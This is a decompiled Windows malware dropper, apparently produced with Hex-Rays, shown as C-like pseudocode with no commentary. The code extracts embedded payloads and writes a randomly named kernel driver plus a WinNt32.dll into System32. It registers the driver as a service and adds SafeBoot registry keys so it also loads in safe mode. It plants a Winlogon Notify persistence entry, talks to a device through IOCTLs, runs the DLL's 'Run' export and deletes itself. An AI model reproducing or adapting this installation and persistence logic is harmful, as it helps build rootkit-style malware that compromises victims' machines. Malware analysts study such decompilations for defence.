/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

_BYTE *__cdecl sub_8001340(_BYTE *, _BYTE *, int);
_BYTE *__cdecl sub_8001390(_BYTE *, char, int);
LPVOID __stdcall sub_80013D0(SIZE_T dwBytes);
BOOL __stdcall sub_8001420(LPVOID lpMem);
int sub_8001450();
_BYTE *__stdcall sub_80015A0(HMODULE hModule, int, LPCSTR lpName, int);
int __stdcall sub_8001670(LPCSTR lpFileName, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite); // idb
DWORD sub_80016E0();
LPSTR __stdcall sub_8001700(LPSTR lpBuffer, LPCSTR lpString2);
LPSTR __stdcall sub_80017E0(LPSTR lpBuffer);
BOOL __stdcall sub_8001820(LPCSTR lpBinaryPathName, LPCSTR lpServiceName);
LSTATUS __stdcall sub_80018F0(LPCSTR lpString2);
LSTATUS __stdcall sub_8001A00(LPCSTR, LPCSTR lpString2);
LSTATUS sub_8001BA0();
HANDLE sub_8001C70();
int start();
// BOOL __usercall sub_8001FF8@<eax>(BOOL result@<eax>, int@<edx>, int@<ecx>, int@<ebx>, int@<ebp>, int@<edi>, int@<esi>, int);

//-------------------------------------------------------------------------
// Data declarations

// extern BOOL (__stdcall *CloseServiceHandle)(SC_HANDLE hSCObject);
// extern BOOL (__stdcall *StartServiceA)(SC_HANDLE hService, DWORD dwNumServiceArgs, LPCSTR *lpServiceArgVectors);
// extern SC_HANDLE (__stdcall *CreateServiceA)(SC_HANDLE hSCManager, LPCSTR lpServiceName, LPCSTR lpDisplayName, DWORD dwDesiredAccess, DWORD dwServiceType, DWORD dwStartType, DWORD dwErrorControl, LPCSTR lpBinaryPathName, LPCSTR lpLoadOrderGroup, LPDWORD lpdwTagId, LPCSTR lpDependencies, LPCSTR lpServiceStartName, LPCSTR lpPassword);
// extern SC_HANDLE (__stdcall *OpenServiceA)(SC_HANDLE hSCManager, LPCSTR lpServiceName, DWORD dwDesiredAccess);
// extern SC_HANDLE (__stdcall *OpenSCManagerA)(LPCSTR lpMachineName, LPCSTR lpDatabaseName, DWORD dwDesiredAccess);
// extern LSTATUS (__stdcall *RegCloseKey)(HKEY hKey);
// extern LSTATUS (__stdcall *RegSetValueA)(HKEY hKey, LPCSTR lpSubKey, DWORD dwType, LPCSTR lpData, DWORD cbData);
// extern LSTATUS (__stdcall *RegCreateKeyA)(HKEY hKey, LPCSTR lpSubKey, PHKEY phkResult);
// extern LSTATUS (__stdcall *RegSetValueExA)(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData);
// extern LPVOID (__stdcall *HeapAlloc)(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
// extern HANDLE (__stdcall *GetProcessHeap)();
// extern BOOL (__stdcall *HeapFree)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
// extern void (__stdcall __noreturn *ExitProcess)(UINT uExitCode);
// extern BOOL (__stdcall *CreateProcessA)(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
// extern DWORD (__stdcall *GetEnvironmentVariableA)(LPCSTR lpName, LPSTR lpBuffer, DWORD nSize);
// extern LPSTR (__stdcall *lstrcatA)(LPSTR lpString1, LPCSTR lpString2);
// extern DWORD (__stdcall *GetShortPathNameA)(LPCSTR lpszLongPath, LPSTR lpszShortPath, DWORD cchBuffer);
// extern int (__stdcall *lstrlenA)(LPCSTR lpString);
// extern LPSTR (__stdcall *lstrcpyA)(LPSTR lpString1, LPCSTR lpString2);
// extern LPSTR (__stdcall *GetCommandLineA)();
// extern BOOL (__stdcall *FreeResource)(HGLOBAL hResData);
// extern LPVOID (__stdcall *LockResource)(HGLOBAL hResData);
// extern DWORD (__stdcall *SizeofResource)(HMODULE hModule, HRSRC hResInfo);
// extern HGLOBAL (__stdcall *LoadResource)(HMODULE hModule, HRSRC hResInfo);
// extern HRSRC (__stdcall *FindResourceA)(HMODULE hModule, LPCSTR lpName, LPCSTR lpType);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// extern HANDLE (__stdcall *CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern BOOL (__stdcall *QueryPerformanceCounter)(LARGE_INTEGER *lpPerformanceCount);
// extern DWORD (__stdcall *GetLastError)();
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern void (__stdcall *Sleep)(DWORD dwMilliseconds);
// extern BOOL (__stdcall *DeviceIoControl)(HANDLE hDevice, DWORD dwIoControlCode, LPVOID lpInBuffer, DWORD nInBufferSize, LPVOID lpOutBuffer, DWORD nOutBufferSize, LPDWORD lpBytesReturned, LPOVERLAPPED lpOverlapped);
// extern BOOL (__stdcall *GetVersionExA)(LPOSVERSIONINFOA lpVersionInformation);
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern BOOL (__stdcall *TerminateProcess)(HANDLE hProcess, UINT uExitCode);
// extern HANDLE (__stdcall *GetCurrentProcess)();
// extern LONG (__stdcall *UnhandledExceptionFilter)(struct _EXCEPTION_POINTERS *ExceptionInfo);
// extern LPTOP_LEVEL_EXCEPTION_FILTER (__stdcall *SetUnhandledExceptionFilter)(LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter);
const struct _EXCEPTION_POINTERS ExceptionInfo = { &dword_8003010, &dword_8003060 }; // idb
int dword_8003000 = -1153374642; // weak
HANDLE hHeap = NULL; // idb
int dword_8003010 = 0; // weak
int dword_8003014 = 0; // weak
int dword_800301C = 0; // weak
int dword_8003060 = 0; // weak
__int16 word_80030EC = 0; // weak
__int16 word_80030F0 = 0; // weak
__int16 word_80030F4 = 0; // weak
__int16 word_80030F8 = 0; // weak
int dword_80030FC = 0; // weak
int dword_8003100 = 0; // weak
int dword_8003104 = 0; // weak
int dword_8003108 = 0; // weak
int dword_800310C = 0; // weak
int dword_8003110 = 0; // weak
int dword_8003114 = 0; // weak
int dword_8003118 = 0; // weak
__int16 word_800311C = 0; // weak
int dword_8003120 = 0; // weak
int dword_8003124 = 0; // weak
__int16 word_8003128 = 0; // weak


//----- (08001340) --------------------------------------------------------
_BYTE *__cdecl sub_8001340(_BYTE *a1, _BYTE *a2, int a3)
{
  _BYTE *v5; // [esp+0h] [ebp-4h]

  v5 = a1;
  while ( a3-- )
    *a1++ = *a2++;
  return v5;
}

//----- (08001390) --------------------------------------------------------
_BYTE *__cdecl sub_8001390(_BYTE *a1, char a2, int a3)
{
  _BYTE *v5; // [esp+0h] [ebp-4h]

  v5 = a1;
  while ( a3-- )
    *a1++ = a2;
  return v5;
}

//----- (080013D0) --------------------------------------------------------
LPVOID __stdcall sub_80013D0(SIZE_T dwBytes)
{
  if ( !hHeap )
    hHeap = GetProcessHeap();
  if ( hHeap )
    return HeapAlloc(hHeap, 0, dwBytes);
  else
    return 0;
}

//----- (08001420) --------------------------------------------------------
BOOL __stdcall sub_8001420(LPVOID lpMem)
{
  BOOL result; // eax

  if ( hHeap )
    return HeapFree(hHeap, 0, lpMem);
  return result;
}

//----- (08001450) --------------------------------------------------------
int sub_8001450()
{
  const CHAR *CommandLineA; // eax
  char v2[2]; // [esp+0h] [ebp-27Ah]
  CHAR String1; // [esp+2h] [ebp-278h] BYREF
  char v4; // [esp+3h] [ebp-277h] BYREF
  struct _STARTUPINFOA StartupInfo; // [esp+10Ah] [ebp-170h] BYREF
  LPCSTR lpszLongPath; // [esp+156h] [ebp-124h]
  struct _PROCESS_INFORMATION ProcessInformation; // [esp+15Ah] [ebp-120h] BYREF
  CHAR CommandLine[268]; // [esp+16Ah] [ebp-110h] BYREF

  lpszLongPath = &String1;
  StartupInfo.cb = 68;
  sub_8001390(&StartupInfo.lpReserved, 0, 64);
  CommandLineA = GetCommandLineA();
  lstrcpyA(&String1, CommandLineA);
  if ( String1 == 34 )
  {
    v2[lstrlenA(&String1)] = 0;
    lpszLongPath = &v4;
  }
  if ( GetShortPathNameA(lpszLongPath, (LPSTR)lpszLongPath, 0x104u) )
  {
    lstrcpyA(CommandLine, "/c del ");
    lstrcatA(CommandLine, lpszLongPath);
    lstrcatA(CommandLine, " >> NUL");
    GetEnvironmentVariableA("ComSpec", (LPSTR)lpszLongPath, 0x104u);
    if ( CreateProcessA(lpszLongPath, CommandLine, 0, 0, 0, 0x8000000u, 0, 0, &StartupInfo, &ProcessInformation) )
      ExitProcess(0);
  }
  return 0;
}
// 8001450: using guessed type char var_27A[2];

//----- (080015A0) --------------------------------------------------------
_BYTE *__stdcall sub_80015A0(HMODULE hModule, int a2, LPCSTR lpName, int a4)
{
  HGLOBAL Resource; // eax
  _BYTE *v6; // [esp+0h] [ebp-14h]
  HGLOBAL hResData; // [esp+4h] [ebp-10h]
  _BYTE *v8; // [esp+8h] [ebp-Ch]
  DWORD dwBytes; // [esp+Ch] [ebp-8h]
  HRSRC hResInfo; // [esp+10h] [ebp-4h]

  v8 = 0;
  hResInfo = 0;
  if ( a2 )
  {
    hResInfo = FindResourceA(hModule, (LPCSTR)(unsigned __int16)a2, "BIN");
    Resource = LoadResource(hModule, hResInfo);
  }
  else
  {
    if ( lpName )
      hResInfo = FindResourceA(hModule, lpName, "BIN");
    Resource = LoadResource(hModule, hResInfo);
  }
  hResData = Resource;
  dwBytes = SizeofResource(hModule, hResInfo);
  if ( hResData )
  {
    v6 = LockResource(hResData);
    if ( v6 )
    {
      *(_DWORD *)a4 = dwBytes;
      v8 = sub_80013D0(dwBytes);
      sub_8001340(v8, v6, dwBytes);
    }
    FreeResource(hResData);
  }
  return v8;
}

//----- (08001670) --------------------------------------------------------
int __stdcall sub_8001670(LPCSTR lpFileName, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite)
{
  HANDLE hFile; // [esp+0h] [ebp-4h]

  if ( !lpBuffer )
    return 0;
  if ( !nNumberOfBytesToWrite )
    return 0;
  hFile = CreateFileA(lpFileName, 0x40000000u, 0, 0, 2u, 0x80u, 0);
  if ( hFile == (HANDLE)-1 )
    return 0;
  WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, &nNumberOfBytesToWrite, 0);
  CloseHandle(hFile);
  return 1;
}

//----- (080016E0) --------------------------------------------------------
DWORD sub_80016E0()
{
  LARGE_INTEGER PerformanceCount; // [esp+0h] [ebp-8h] BYREF

  QueryPerformanceCounter(&PerformanceCount);
  return PerformanceCount.LowPart;
}

//----- (08001700) --------------------------------------------------------
LPSTR __stdcall sub_8001700(LPSTR lpBuffer, LPCSTR lpString2)
{
  *lpString2 = (unsigned __int16)sub_80016E0() % 25 + 65;
  *((_BYTE *)lpString2 + 1) = (unsigned __int16)sub_80016E0() % 25 + 97;
  *((_BYTE *)lpString2 + 2) = (unsigned __int16)sub_80016E0() % 25 + 97;
  *((_BYTE *)lpString2 + 3) = (unsigned __int16)sub_80016E0() % 9 + 48;
  *((_BYTE *)lpString2 + 4) = (unsigned __int16)sub_80016E0() % 9 + 48;
  *((_BYTE *)lpString2 + 5) = 0;
  GetEnvironmentVariableA("SystemRoot", lpBuffer, 0x104u);
  lstrcatA(lpBuffer, "\\System32\\drivers\\");
  lstrcatA(lpBuffer, lpString2);
  return lstrcatA(lpBuffer, ".sys");
}

//----- (080017E0) --------------------------------------------------------
LPSTR __stdcall sub_80017E0(LPSTR lpBuffer)
{
  GetEnvironmentVariableA("SystemRoot", lpBuffer, 0x104u);
  return lstrcatA(lpBuffer, "\\System32\\WinNt32.dll");
}

//----- (08001820) --------------------------------------------------------
BOOL __stdcall sub_8001820(LPCSTR lpBinaryPathName, LPCSTR lpServiceName)
{
  SC_HANDLE hSCManager; // [esp+0h] [ebp-10h]
  BOOL v4; // [esp+8h] [ebp-8h]
  SC_HANDLE hService; // [esp+Ch] [ebp-4h]

  hSCManager = OpenSCManagerA(0, 0, 0xF003Fu);
  hService = OpenServiceA(hSCManager, lpServiceName, 0xF01FFu);
  if ( !hService )
    hService = CreateServiceA(hSCManager, lpServiceName, 0, 0xF01FFu, 1u, 3u, 0, lpBinaryPathName, 0, 0, 0, 0, 0);
  v4 = hService && StartServiceA(hService, 0, 0) || GetLastError() == 1056;
  if ( hService )
    CloseServiceHandle(hService);
  return v4;
}

//----- (080018F0) --------------------------------------------------------
LSTATUS __stdcall sub_80018F0(LPCSTR lpString2)
{
  HKEY phkResult; // [esp+0h] [ebp-20Ch] BYREF
  CHAR String1[256]; // [esp+4h] [ebp-208h] BYREF
  CHAR SubKey[260]; // [esp+104h] [ebp-108h] BYREF

  lstrcpyA(String1, "SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\");
  lstrcatA(String1, lpString2);
  lstrcatA(String1, ".sys");
  lstrcpyA(SubKey, "SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\");
  lstrcatA(SubKey, lpString2);
  lstrcatA(SubKey, ".sys");
  RegCreateKeyA(HKEY_LOCAL_MACHINE, String1, &phkResult);
  RegSetValueA(phkResult, 0, 1u, "Driver", 8u);
  RegCloseKey(phkResult);
  RegCreateKeyA(HKEY_LOCAL_MACHINE, SubKey, &phkResult);
  RegSetValueA(phkResult, 0, 1u, "Driver", 8u);
  return RegCloseKey(phkResult);
}

//----- (08001A00) --------------------------------------------------------
LSTATUS __stdcall sub_8001A00(LPCSTR a1, LPCSTR lpString2)
{
  int v2; // eax
  int v3; // eax
  BYTE Data[4]; // [esp+0h] [ebp-314h] BYREF
  CHAR String[260]; // [esp+4h] [ebp-310h] BYREF
  HKEY phkResult; // [esp+108h] [ebp-20Ch] BYREF
  CHAR String1[256]; // [esp+10Ch] [ebp-208h] BYREF
  char v9[256]; // [esp+20Ch] [ebp-108h] BYREF
  BYTE v10[4]; // [esp+310h] [ebp-4h] BYREF

  lstrcpyA(String1, lpString2);
  lstrcatA(String1, a1);
  RegCreateKeyA(HKEY_LOCAL_MACHINE, String1, &phkResult);
  *(_DWORD *)Data = 1;
  RegSetValueExA(phkResult, "Type", 0, 4u, Data, 4u);
  *(_DWORD *)v10 = 0;
  RegSetValueExA(phkResult, "Start", 0, 4u, v10, 4u);
  lstrcpyA(String, "System32\\Drivers\\");
  lstrcatA(String, a1);
  lstrcatA(String, ".sys");
  v2 = lstrlenA(String);
  RegSetValueExA(phkResult, "ImagePath", 0, 1u, (const BYTE *)String, v2 + 1);
  strcpy(v9, "SCSI Class");
  sub_8001390(&v9[11], 0, 245);
  v3 = lstrlenA(v9);
  RegSetValueExA(phkResult, "Group", 0, 1u, (const BYTE *)v9, v3 + 1);
  return RegCloseKey(phkResult);
}

//----- (08001BA0) --------------------------------------------------------
LSTATUS sub_8001BA0()
{
  int v0; // eax
  int v1; // eax
  BYTE v3[4]; // [esp+0h] [ebp-14h] BYREF
  LPCSTR lpString; // [esp+4h] [ebp-10h]
  LPCSTR v5; // [esp+8h] [ebp-Ch]
  HKEY phkResult; // [esp+Ch] [ebp-8h] BYREF
  BYTE Data[4]; // [esp+10h] [ebp-4h] BYREF

  lpString = "WinNt32.dll";
  v5 = "WLEventStartShell";
  *(_DWORD *)Data = 0;
  *(_DWORD *)v3 = 0;
  RegCreateKeyA(
    HKEY_LOCAL_MACHINE,
    "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\WinNt32",
    &phkResult);
  v0 = lstrlenA("WinNt32.dll");
  RegSetValueExA(phkResult, "DLLName", 0, 1u, (const BYTE *)"WinNt32.dll", v0 + 1);
  v1 = lstrlenA("WLEventStartShell");
  RegSetValueExA(phkResult, "StartShell", 0, 1u, (const BYTE *)"WLEventStartShell", v1 + 1);
  RegSetValueExA(phkResult, "Impersonate", 0, 4u, Data, 4u);
  RegSetValueExA(phkResult, "Asynchronous", 0, 4u, v3, 4u);
  return RegCloseKey(phkResult);
}

//----- (08001C70) --------------------------------------------------------
HANDLE sub_8001C70()
{
  return CreateFileA("\\\\.\\Prot2", 0xC0000000, 0, 0, 2u, 0x80u, 0);
}

//----- (08001CA0) --------------------------------------------------------
int start()
{
  BOOL v1; // [esp+0h] [ebp-400h]
  BOOL v2; // [esp+4h] [ebp-3FCh]
  BOOL v3; // [esp+8h] [ebp-3F8h]
  void (*Run)(void); // [esp+Ch] [ebp-3F4h]
  HMODULE hModule; // [esp+10h] [ebp-3F0h]
  DWORD v6; // [esp+14h] [ebp-3ECh] BYREF
  HANDLE hObject; // [esp+18h] [ebp-3E8h]
  DWORD BytesReturned; // [esp+1Ch] [ebp-3E4h] BYREF
  HANDLE hDevice; // [esp+20h] [ebp-3E0h]
  LPVOID lpMem; // [esp+24h] [ebp-3DCh]
  int v11; // [esp+28h] [ebp-3D8h]
  DWORD nNumberOfBytesToWrite; // [esp+2Ch] [ebp-3D4h] BYREF
  DWORD nInBufferSize; // [esp+30h] [ebp-3D0h] BYREF
  LPVOID lpInBuffer; // [esp+34h] [ebp-3CCh]
  struct _OSVERSIONINFOA VersionInformation; // [esp+38h] [ebp-3C8h] BYREF
  CHAR FileName[264]; // [esp+D0h] [ebp-330h] BYREF
  HMODULE ModuleHandleA; // [esp+1D8h] [ebp-228h]
  BOOL v18; // [esp+1DCh] [ebp-224h]
  CHAR String2[264]; // [esp+1E0h] [ebp-220h] BYREF
  CHAR LibFileName[268]; // [esp+2E8h] [ebp-118h] BYREF
  BOOL v21; // [esp+3F8h] [ebp-8h]
  BOOL v22; // [esp+3FCh] [ebp-4h]

  VersionInformation.dwOSVersionInfoSize = 148;
  ModuleHandleA = GetModuleHandleA(0);
  GetVersionExA(&VersionInformation);
  v3 = VersionInformation.dwMajorVersion == 5 && !VersionInformation.dwMinorVersion;
  v22 = v3;
  v2 = VersionInformation.dwMajorVersion == 5 && VersionInformation.dwMinorVersion == 1;
  v18 = v2;
  v1 = VersionInformation.dwMajorVersion == 5 && VersionInformation.dwMinorVersion == 2;
  v21 = v1;
  sub_80017E0(LibFileName);
  sub_8001700(FileName, String2);
  if ( v22 || v18 || v21 )
  {
    lpInBuffer = sub_80015A0(ModuleHandleA, 101, 0, (int)&nInBufferSize);
    lpMem = sub_80015A0(ModuleHandleA, 102, 0, (int)&nNumberOfBytesToWrite);
    v11 = 0;
    hDevice = sub_8001C70();
    if ( hDevice == (HANDLE)-1 )
    {
      if ( sub_8001670(LibFileName, lpMem, nNumberOfBytesToWrite) == 1 )
        v11 = 1;
      sub_8001670(FileName, lpInBuffer, nInBufferSize);
      sub_8001BA0();
      sub_80018F0(String2);
      sub_8001820(FileName, String2);
      Sleep(0x1F4u);
      sub_8001A00(String2, "SYSTEM\\ControlSet001\\Services\\");
      sub_8001A00(String2, "SYSTEM\\ControlSet002\\Services\\");
      Sleep(0x1F4u);
      hObject = sub_8001C70();
      if ( hObject != (HANDLE)-1 )
      {
        DeviceIoControl(hObject, 0x9D082444, lpMem, nNumberOfBytesToWrite, 0, 0, &v6, 0);
        DeviceIoControl(hObject, 0x9D082480, 0, 0, 0, 0, &v6, 0);
        CloseHandle(hObject);
      }
    }
    else
    {
      DeviceIoControl(hDevice, 0x9D082440, lpInBuffer, nInBufferSize, 0, 0, &BytesReturned, 0);
      DeviceIoControl(hDevice, 0x9D082444, lpMem, nNumberOfBytesToWrite, 0, 0, &BytesReturned, 0);
      CloseHandle(hDevice);
    }
    sub_8001420(lpInBuffer);
    sub_8001420(lpMem);
    if ( v11 )
    {
      hModule = LoadLibraryA(LibFileName);
      if ( hModule )
      {
        Run = (void (*)(void))GetProcAddress(hModule, "Run");
        if ( Run )
          Run();
      }
    }
  }
  return sub_8001450();
}

//----- (08001FF8) --------------------------------------------------------
BOOL __usercall sub_8001FF8@<eax>(
        BOOL result@<eax>,
        int a2@<edx>,
        int a3@<ecx>,
        int a4@<ebx>,
        int a5@<ebp>,
        int a6@<edi>,
        int a7@<esi>,
        int a8)
{
  unsigned int v8; // kr00_4
  HANDLE CurrentProcess; // eax
  int retaddr; // [esp+0h] [ebp+0h]

  if ( a3 != dword_8003000 )
  {
    dword_8003110 = result;
    dword_800310C = a3;
    dword_8003108 = a2;
    dword_8003104 = a4;
    dword_8003100 = a7;
    dword_80030FC = a6;
    word_8003128 = __SS__;
    word_800311C = __CS__;
    word_80030F8 = __DS__;
    word_80030F4 = __ES__;
    word_80030F0 = __FS__;
    word_80030EC = __GS__;
    v8 = __readeflags();
    dword_8003120 = v8;
    dword_8003124 = (int)&a8;
    dword_8003118 = retaddr;
    dword_8003060 = 65537;
    dword_800301C = retaddr;
    dword_8003114 = a5;
    dword_8003010 = -1073740791;
    dword_8003014 = 1;
    SetUnhandledExceptionFilter(0);
    UnhandledExceptionFilter((struct _EXCEPTION_POINTERS *)&ExceptionInfo);
    CurrentProcess = GetCurrentProcess();
    return TerminateProcess(CurrentProcess, 0xC0000409);
  }
  return result;
}
// 8001FF8: could not find valid save-restore pair for ebp
// 8003000: using guessed type int dword_8003000;
// 8003010: using guessed type int dword_8003010;
// 8003014: using guessed type int dword_8003014;
// 800301C: using guessed type int dword_800301C;
// 8003060: using guessed type int dword_8003060;
// 80030EC: using guessed type __int16 word_80030EC;
// 80030F0: using guessed type __int16 word_80030F0;
// 80030F4: using guessed type __int16 word_80030F4;
// 80030F8: using guessed type __int16 word_80030F8;
// 80030FC: using guessed type int dword_80030FC;
// 8003100: using guessed type int dword_8003100;
// 8003104: using guessed type int dword_8003104;
// 8003108: using guessed type int dword_8003108;
// 800310C: using guessed type int dword_800310C;
// 8003110: using guessed type int dword_8003110;
// 8003114: using guessed type int dword_8003114;
// 8003118: using guessed type int dword_8003118;
// 800311C: using guessed type __int16 word_800311C;
// 8003120: using guessed type int dword_8003120;
// 8003124: using guessed type int dword_8003124;
// 8003128: using guessed type __int16 word_8003128;

// nfuncs=17 queued=17 decompiled=17 lumina nreq=0 worse=0 better=0
// ALL OK, 17 function(s) have been successfully decompiled
